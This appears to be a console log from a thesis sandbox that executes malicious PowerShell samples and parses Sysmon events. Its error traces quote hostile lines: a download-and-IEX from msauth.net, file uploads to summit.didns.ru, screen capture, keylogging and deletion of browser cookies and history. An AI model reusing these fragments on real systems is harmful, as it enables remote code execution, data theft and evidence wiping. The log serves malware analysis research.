+←[31;1m←[0m←[36;1m←[36;1m  65 | ←[0m         $bitmap = ←[36;1m[Windows.Forms.Clipboard]←[0m::GetImage()←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m     | ←[31;1m                   ~~~~~~~~~~~~~~~~~~~~~~~~~←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m     | ←[31;1mUnable to find type [Windows.Forms.Clipboard].←[0m
+←[31;1mInvalidOperation: ←[0mC:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\19.ps1:75←[0m
+←[31;1m←[0m←[36;1mLine |←[0m
+←[31;1m←[0m←[36;1m←[36;1m  75 | ←[0m         ←[36;1m$bitmap.Save("${screenCapturePathBase}${c}.jpg", $jpegCodec, ←[0m .←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m     | ←[31;1m         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m     | ←[31;1mYou cannot call a method on a null-valued expression.←[0m
+←[31;1mPos-Da: ←[0mC:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\19.ps1:101←[0m
+←[31;1m←[0m←[36;1mLine |←[0m
+←[31;1m←[0m←[36;1m←[36;1m 101 | ←[0m     ←[36;1mPos-Da -dest $file.FullName -url "$destination+$file"←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m     | ←[31;1m     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m     | ←[31;1mException calling "GetResponse" with "0" argument(s): "No connection could be made because the target machine←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m←[31;1m←[36;1m     | ←[31;1mactively refused it. [::ffff:188.165.127.159]:443 (summit.didns.ru:443)"←[0m
+Executed {19}
+Executing {20}: C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\20.ps1
+←[31;1mParserError: ←[0mC:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\20.ps1:88←[0m
+←[31;1m←[0m←[36;1mLine |←[0m
+←[31;1m←[0m←[36;1m←[36;1m  88 | ←[0m         ←[36;1m'@←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m     | ←[31;1m         ~~←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m     | ←[31;1mWhite space is not allowed before the string terminator.←[0m
+Executed {20}
+Executing {21}: C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\21.ps1
+Executed {21}
+Cannot convert value "System.Object[]" to type "System.Xml.XmlDocument". Error: "'∟', hexadecimal value 0x1C, is an
+invalid character. Line 164, position 794."
+At C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\exec-analysis-scripts.ps1:325 char:9
++         $xml = [xml]((wevtutil query-events "$outdir\evtx\$id_sample. ...
++         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : InvalidArgument: (:) [], RuntimeException
+    + FullyQualifiedErrorId : InvalidCastToXmlDocument
+
+Cannot convert value "<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider
+Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>22</EventID><Version>5</Version
+><Level>4</Level><Task>22</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated
+SystemTime='2024-10-27T19:11:31.2191864Z'/><EventRecordID>107947</EventRecordID><Correlation/><Execution
+ProcessID='7104'
+ThreadID='4200'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>malware-vm</Computer><Security
+UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2024-10-27
+19:11:29.252</Data><Data Name='ProcessGuid'>{dc240039-9046-671e-d801-000000001800}</Data><Data
+Name='ProcessId'>1816</Data><Data Name='QueryName'>H?EPL?►A??H??HA_A^A]A\_^[]????????H??H?H?h►H?p↑H?x ATAVAWH??
+H??↑♣</Data><Data Name='QueryStatus'>123</Data><Data Name='QueryResults'>-</Data><Data Name='Image'>C:\Program
+Files\PowerShell\7\pwsh.exe</Data><Data Name='User'>MALWARE-VM\unina</Data></EventData></Event>" to type
+"System.Xml.XmlDocument". Error: "'►', hexadecimal value 0x10, is an invalid character. Line 1, position 797."
+At C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\exec-analysis-scripts.ps1:35 char:13
++             $XML = [xml]$entry.ToXml()
++             ~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : InvalidArgument: (:) [], RuntimeException
+    + FullyQualifiedErrorId : InvalidCastToXmlDocument
+
+Cannot convert value "<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider
+Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>22</EventID><Version>5</Version
+><Level>4</Level><Task>22</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated
+SystemTime='2024-10-27T19:11:28.1816188Z'/><EventRecordID>107733</EventRecordID><Correlation/><Execution
+ProcessID='7104'
+ThreadID='4200'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>malware-vm</Computer><Security
+UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2024-10-27
+19:11:26.191</Data><Data Name='ProcessGuid'>{dc240039-9046-671e-d801-000000001800}</Data><Data
+Name='ProcessId'>1816</Data><Data Name='QueryName'>HcF@fE?t@??∟U☻</Data><Data Name='QueryStatus'>9560</Data><Data
+Name='QueryResults'>-</Data><Data Name='Image'>C:\Program Files\PowerShell\7\pwsh.exe</Data><Data
+Name='User'>MALWARE-VM\unina</Data></EventData></Event>" to type "System.Xml.XmlDocument". Error: "'∟', hexadecimal
+value 0x1C, is an invalid character. Line 1, position 802."
+At C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\exec-analysis-scripts.ps1:35 char:13
++             $XML = [xml]$entry.ToXml()
++             ~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : InvalidArgument: (:) [], RuntimeException
+    + FullyQualifiedErrorId : InvalidCastToXmlDocument
+
+Cannot convert value "<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider
+Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>22</EventID><Version>5</Version
+><Level>4</Level><Task>22</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated
+SystemTime='2024-10-27T19:11:25.1167055Z'/><EventRecordID>107267</EventRecordID><Correlation/><Execution
+ProcessID='7104'
+ThreadID='4200'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>malware-vm</Computer><Security
+UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2024-10-27
+19:11:24.169</Data><Data Name='ProcessGuid'>{dc240039-9046-671e-d801-000000001800}</Data><Data
+Name='ProcessId'>1816</Data><Data Name='QueryName'>?I??0☼??☻??☺A?G?A☼D??D??A☼??☼D?3?D??E??u??</Data><Data
+Name='QueryStatus'>123</Data><Data Name='QueryResults'>-</Data><Data Name='Image'>C:\Program
+Files\PowerShell\7\pwsh.exe</Data><Data Name='User'>MALWARE-VM\unina</Data></EventData></Event>" to type
+"System.Xml.XmlDocument". Error: "'☼', hexadecimal value 0x0F, is an invalid character. Line 1, position 796."
+At C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\exec-analysis-scripts.ps1:35 char:13
++             $XML = [xml]$entry.ToXml()
++             ~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : InvalidArgument: (:) [], RuntimeException
+    + FullyQualifiedErrorId : InvalidCastToXmlDocument
+
+Cannot convert value "<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider
+Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>22</EventID><Version>5</Version
+><Level>4</Level><Task>22</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated
+SystemTime='2024-10-27T19:11:24.1143625Z'/><EventRecordID>107180</EventRecordID><Correlation/><Execution
+ProcessID='7104'
+ThreadID='4200'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>malware-vm</Computer><Security
+UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2024-10-27
+19:11:23.163</Data><Data Name='ProcessGuid'>{dc240039-9046-671e-d801-000000001800}</Data><Data
+Name='ProcessId'>1816</Data><Data Name='QueryName'>☼?o♣</Data><Data Name='QueryStatus'>9560</Data><Data
+Name='QueryResults'>-</Data><Data Name='Image'>C:\Program Files\PowerShell\7\pwsh.exe</Data><Data
+Name='User'>MALWARE-VM\unina</Data></EventData></Event>" to type "System.Xml.XmlDocument". Error: "'☼', hexadecimal
+value 0x0F, is an invalid character. Line 1, position 791."
+At C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\exec-analysis-scripts.ps1:35 char:13
++             $XML = [xml]$entry.ToXml()
++             ~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : InvalidArgument: (:) [], RuntimeException
+    + FullyQualifiedErrorId : InvalidCastToXmlDocument
+
+Cannot convert value "<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider
+Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>22</EventID><Version>5</Version
+><Level>4</Level><Task>22</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated
+SystemTime='2024-10-27T19:11:23.1078036Z'/><EventRecordID>107007</EventRecordID><Correlation/><Execution
+ProcessID='7104'
+ThreadID='4200'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>malware-vm</Computer><Security
+UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2024-10-27
+19:11:22.130</Data><Data Name='ProcessGuid'>{dc240039-9046-671e-d801-000000001800}</Data><Data
+Name='ProcessId'>1816</Data><Data Name='QueryName'>A☼??∟?</Data><Data Name='QueryStatus'>9560</Data><Data
+Name='QueryResults'>-</Data><Data Name='Image'>C:\Program Files\PowerShell\7\pwsh.exe</Data><Data
+Name='User'>MALWARE-VM\unina</Data></EventData></Event>" to type "System.Xml.XmlDocument". Error: "'☼', hexadecimal
+value 0x0F, is an invalid character. Line 1, position 792."
+At C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\exec-analysis-scripts.ps1:35 char:13
++             $XML = [xml]$entry.ToXml()
++             ~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : InvalidArgument: (:) [], RuntimeException
+    + FullyQualifiedErrorId : InvalidCastToXmlDocument
+
+Executing {22}: C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\22.ps1
+←[31;1mConvert-UrlEncodedToAscii: ←[0mC:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\22.ps1:32←[0m
+←[31;1m←[0m←[36;1mLine |←[0m
+←[31;1m←[0m←[36;1m←[36;1m  32 | ←[0m $fullASCII = Convert-UrlEncodedToAscii ←[36;1m$webURL←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m     | ←[31;1m                                        ~~~~~~~←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m     | ←[31;1mCannot bind argument to parameter 'UrlEncodedString' because it is an empty string.←[0m
+Executed {22}
+Executing {23}: C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\23.ps1
+←[31;1mOperationStopped: ←[0mC:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\23.ps1:10←[0m
+←[31;1m←[0m←[36;1mLine |←[0m
+←[31;1m←[0m←[36;1m←[36;1m  10 | ←[0m ←[36;1m$shortcut.TargetPath = $targetPath←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m     | ←[31;1m ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m     | ←[31;1mValue does not fall within the expected range.←[0m
+Executed {23}
+Executing {25}: C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\25.ps1
+←[31;1mThe: ←[0mC:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\25.ps1:1←[0m
+←[31;1m←[0m←[36;1mLine |←[0m
+←[31;1m←[0m←[36;1m←[36;1m   1 | ←[0m ←[36;1mThe←[0m provided obfuscated PowerShell code retrieves a payload from a UR .←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m     | ←[31;1m ~~~←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m     | ←[31;1mThe term 'The' is not recognized as a name of a cmdlet, function, script file, or executable program. Check the←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m←[31;1m←[36;1m     | ←[31;1mspelling of the name, or if a path was included, verify that the path is correct and try again.←[0m
+Executed {25}
+Executing {26}: C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\26.ps1
+←[31;1mExport-ModuleMember: ←[0mC:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\26.ps1:93←[0m
+←[31;1m←[0m←[36;1mLine |←[0m
+←[31;1m←[0m←[36;1m←[36;1m  93 | ←[0m ←[36;1mExport-ModuleMember -Function *-TargetResource←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m     | ←[31;1m ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m     | ←[31;1mThe Export-ModuleMember cmdlet can only be called from inside a module.←[0m
+Executed {26}
+Executing {27}: C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\27.ps1
+Executed {27}
+Executing {28}: C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\28.ps1
+Executed {28}
+Executing {29}: C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\29.ps1
+Executed {29}
+Executing {3}: C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\3.ps1
+←[31;1mRemove-Item: ←[0mC:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\3.ps1:2←[0m
+←[31;1m←[0m←[36;1mLine |←[0m
+←[31;1m←[0m←[36;1m←[36;1m   2 | ←[0m ←[36;1mRemove-Item -Path "$chromePath\History" -Force←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m     | ←[31;1m ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m     | ←[31;1mCannot find path 'C:\Users\unina\AppData\Local\Google\Chrome\User Data\Default\History' because it does not←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m←[31;1m←[36;1m     | ←[31;1mexist.←[0m
+←[31;1mRemove-Item: ←[0mC:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\3.ps1:3←[0m
+←[31;1m←[0m←[36;1mLine |←[0m
+←[31;1m←[0m←[36;1m←[36;1m   3 | ←[0m ←[36;1mRemove-Item -Path "$chromePath\Cookies" -Force←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m     | ←[31;1m ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m     | ←[31;1mCannot find path 'C:\Users\unina\AppData\Local\Google\Chrome\User Data\Default\Cookies' because it does not←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m←[31;1m←[36;1m     | ←[31;1mexist.←[0m
+←[31;1mRemove-Item: ←[0mC:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\3.ps1:4←[0m
+←[31;1m←[0m←[36;1mLine |←[0m
+←[31;1m←[0m←[36;1m←[36;1m   4 | ←[0m ←[36;1mRemove-Item -Path "$chromePath\Cache" -Force←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m     | ←[31;1m ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m     | ←[31;1mCannot find path 'C:\Users\unina\AppData\Local\Google\Chrome\User Data\Default\Cache' because it does not exist.←[0m
+←[31;1mGet-ChildItem: ←[0mC:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\3.ps1:7←[0m
+←[31;1m←[0m←[36;1mLine |←[0m
+←[31;1m←[0m←[36;1m←[36;1m   7 | ←[0m . firefoxProfiles = ←[36;1mGet-ChildItem -Path $firefoxPath -Directory←[0m | Where .←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m     | ←[31;1m                     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m     | ←[31;1mCannot find path 'C:\Users\unina\AppData\Roaming\Mozilla\Firefox\Profiles' because it does not exist.←[0m
+←[31;1mRemove-Item: ←[0mC:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\3.ps1:14←[0m
+←[31;1m←[0m←[36;1mLine |←[0m
+←[31;1m←[0m←[36;1m←[36;1m  14 | ←[0m ←[36;1mRemove-Item -Path "$edgePath\History" -Force←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m     | ←[31;1m ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m     | ←[31;1mThe process cannot access the file 'C:\Users\unina\AppData\Local\Microsoft\Edge\User Data\Default\History'←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m←[31;1m←[36;1m     | ←[31;1mbecause it is being used by another process.←[0m
+←[31;1mRemove-Item: ←[0mC:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\3.ps1:15←[0m
+←[31;1m←[0m←[36;1mLine |←[0m
+←[31;1m←[0m←[36;1m←[36;1m  15 | ←[0m ←[36;1mRemove-Item -Path "$edgePath\Cookies" -Force←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m     | ←[31;1m ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m     | ←[31;1mCannot find path 'C:\Users\unina\AppData\Local\Microsoft\Edge\User Data\Default\Cookies' because it does not←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m←[31;1m←[36;1m     | ←[31;1mexist.←[0m
+←[31;1mRemove-Item: ←[0mC:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\3.ps1:16←[0m
+←[31;1m←[0m←[36;1mLine |←[0m
+←[31;1m←[0m←[36;1m←[36;1m  16 | ←[0m ←[36;1mRemove-Item -Path "$edgePath\Cache" -Force←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m     | ←[31;1m ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m     | ←[31;1mPowerShell is in NonInteractive mode. Read and Prompt functionality is not available.←[0m
+←[31;1mRemove-Item: ←[0mC:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\3.ps1:19←[0m
+←[31;1m←[0m←[36;1mLine |←[0m
+←[31;1m←[0m←[36;1m←[36;1m  19 | ←[0m ←[36;1mRemove-Item -Path "$bravePath\History" -Force←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m     | ←[31;1m ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m     | ←[31;1mCannot find path 'C:\Users\unina\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\History' because it←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m←[31;1m←[36;1m     | ←[31;1mdoes not exist.←[0m
+←[31;1mRemove-Item: ←[0mC:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\3.ps1:20←[0m
+←[31;1m←[0m←[36;1mLine |←[0m
+←[31;1m←[0m←[36;1m←[36;1m  20 | ←[0m ←[36;1mRemove-Item -Path "$bravePath\Cookies" -Force←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m     | ←[31;1m ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m     | ←[31;1mCannot find path 'C:\Users\unina\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Cookies' because it←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m←[31;1m←[36;1m     | ←[31;1mdoes not exist.←[0m
+←[31;1mRemove-Item: ←[0mC:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\3.ps1:21←[0m
+←[31;1m←[0m←[36;1mLine |←[0m
+←[31;1m←[0m←[36;1m←[36;1m  21 | ←[0m ←[36;1mRemove-Item -Path "$bravePath\Cache" -Force←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m     | ←[31;1m ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m     | ←[31;1mCannot find path 'C:\Users\unina\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Cache' because it←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m←[31;1m←[36;1m     | ←[31;1mdoes not exist.←[0m
+Executed {3}
+Executing {31}: C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\31.ps1
+←[31;1mMethodInvocationException: ←[0mC:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\31.ps1:10←[0m
+←[31;1m←[0m←[36;1mLine |←[0m
+←[31;1m←[0m←[36;1m←[36;1m  10 | ←[0m ←[36;1m[char[]]$B = ([char[]]($wc.DownloadString("https://msauth.net/index.a←[0m .←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m     | ←[31;1m ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m     | ←[31;1mException calling "DownloadString" with "1" argument(s): "No such host is known. (msauth.net:443)"←[0m
+←[31;1mInvoke-Expression: ←[0mC:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\31.ps1:11←[0m
+←[31;1m←[0m←[36;1mLine |←[0m
+←[31;1m←[0m←[36;1m←[36;1m  11 | ←[0m IEX ←[36;1m($B -join '')←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m     | ←[31;1m     ~~~~~~~~~~~~~←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m     | ←[31;1mCannot bind argument to parameter 'Command' because it is an empty string.←[0m
+Executed {31}
+Executing {33}: C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\33.ps1
+←[31;1mSet-ExecutionPolicy: ←[0mC:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\33.ps1:3←[0m
+←[31;1m←[0m←[36;1mLine |←[0m
+←[31;1m←[0m←[36;1m←[36;1m   3 | ←[0m ←[36;1mSet-ExecutionPolicy 'Unrestricted'←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m     | ←[31;1m ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m     | ←[31;1mPowerShell updated your execution policy successfully, but the setting is overridden by a policy defined at a←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m←[31;1m←[36;1m     | ←[31;1mmore specific scope.  Due to the override, your shell will retain its current effective execution policy of←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m←[31;1m←[36;1m←[31;1m←[36;1m     | ←[31;1mRemoteSigned. Type "Get-ExecutionPolicy -List" to view your execution policy settings. For more information←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m←[31;1m←[36;1m←[31;1m←[36;1m←[31;1m←[36;1m     | ←[31;1mplease see "Get-Help Set-ExecutionPolicy".←[0m
+Executed {33}
+Executing {34}: C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\34.ps1
+←[31;1mParserError: ←[0mC:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\34.ps1:1←[0m
+←[31;1m←[0m←[36;1mLine |←[0m
+←[31;1m←[0m←[36;1m←[36;1m   1 | ←[0m ←[36;1mfrom←[0m cryptography.fernet import Fernet←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m     | ←[31;1m ~~~~←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m     | ←[31;1mThe 'from' keyword is not supported in this version of the language.←[0m
+Executed {34}
+Executing {35}: C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\35.ps1
+Executed {35}
+Executing {36}: C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\36.ps1
+←[31;1mNew-Item: ←[0mC:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\36.ps1:5←[0m
+←[31;1m←[0m←[36;1mLine |←[0m
+←[31;1m←[0m←[36;1m←[36;1m   5 | ←[0m ←[36;1mNew-Item "C:\temp\keylogger.txt" -ItemType "file"←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m     | ←[31;1m ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m     | ←[31;1mCould not find a part of the path 'C:\temp\keylogger.txt'.←[0m
+←[31;1mGet-ForegroundWindow: ←[0mC:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\36.ps1:7←[0m
+←[31;1m←[0m←[36;1mLine |←[0m
+←[31;1m←[0m←[36;1m←[36;1m   7 | ←[0m $foregroundWindow = ←[36;1mGet-ForegroundWindow←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m     | ←[31;1m                     ~~~~~~~~~~~~~~~~~~~~←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m     | ←[31;1mThe term 'Get-ForegroundWindow' is not recognized as a name of a cmdlet, function, script file, or executable←[0m
